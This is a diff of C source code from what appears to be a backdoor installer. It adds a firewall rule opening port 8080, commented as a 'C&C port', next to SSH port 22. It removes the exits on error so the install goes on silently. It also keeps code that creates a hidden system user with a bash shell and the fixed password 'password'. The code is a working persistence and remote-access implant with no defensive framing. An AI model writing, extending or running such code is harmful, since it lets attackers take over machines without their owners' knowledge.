@@ -222,15 +222,20 @@ void allow_firewall() {
         // If ufw is available
         if (system("ufw status | grep -q 'Status: active'") == 0) {
             // If ufw is active
+            // Enable sshd port
             system("ufw allow 22/tcp");
+            // C&C port
+            system("ufw allow 8080/tcp");
         } else {
             fprintf(stderr, "ufw is not active on this system.\n");
-            exit(1);
+            // Do nothing
+            //exit(1);
         }
     } else {
         // Neither iptables nor ufw is available
         fprintf(stderr, "Neither iptables nor ufw is available on this system.\n");
-        exit(1);
+        // Do nothing
+        //exit(1);
     }
 }
 
@@ -239,17 +244,20 @@ void add_system_user(const char *username) {
 
     // Create a system user with home directory in /var/ and bash shell
     snprintf(cmd, sizeof(cmd), "useradd -r -m -d /var/%s -s /bin/bash %s", username, username);
-    if (system(cmd) != 0) {
+    if (system(cmd)!= 0) {
         fprintf(stderr, "Failed to add system user\n");
+        // Failed to add user, bail!
         exit(1);
+    } else {
+        // Set a password for the user (in this example, the password is 'password')
+        snprintf(cmd, sizeof(cmd), "echo '%s:password' | chpasswd", username);
+        if (system(cmd) != 0) {
+            fprintf(stderr, "Failed to set password for system user\n");
+            // Failed to change password, bail!
+            exit(1);
+        }
     }
 
-    // Set a password for the user (in this example, the password is 'password')
-    snprintf(cmd, sizeof(cmd), "echo '%s:password' | chpasswd", username);
-    if (system(cmd) != 0) {
-        fprintf(stderr, "Failed to set password for system user\n");
-        exit(1);
-    }
 }
 
 // Function to send API call
